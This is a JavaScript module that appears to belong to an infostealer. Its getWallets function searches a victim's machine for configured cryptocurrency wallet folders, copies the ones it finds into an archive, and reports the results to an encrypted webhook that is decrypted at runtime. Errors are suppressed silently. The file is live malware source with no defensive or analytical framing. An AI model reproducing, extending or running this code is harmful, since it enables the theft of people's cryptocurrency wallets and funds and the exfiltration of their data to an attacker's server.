module.exports = (client) => {
    return {
        async getWallets() {
            try {
                client.utils.jszip.createFolder("\\Wallets");

                var description = "";

                for (let [key, value] of Object.entries(client.config.wallets.directory)) {

                    if (client.requires.fs.existsSync(value)) {
                        description += `${key}: ✅\n`;
                        client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
                        client.config.counter.wallets++;
                    } else {
                        description += `${key}: ❌\n`;
                    }
                }

                await client.utils.webhook.sendToWebhook(
                    client.config.webhook.wallets ? client.utils.encryption.decryptData(client.config.webhook.wallets) : client.utils.encryption.decryptData(client.config.webhook.url), 
                    {
                    "embeds": [client.utils.webhook.createEmbed({
                        "title": `💰 Wallet search | Result`,
                        "description": `\`\`\`${description}\`\`\``,
                    })],
                })


            } catch {}
        }
    };
};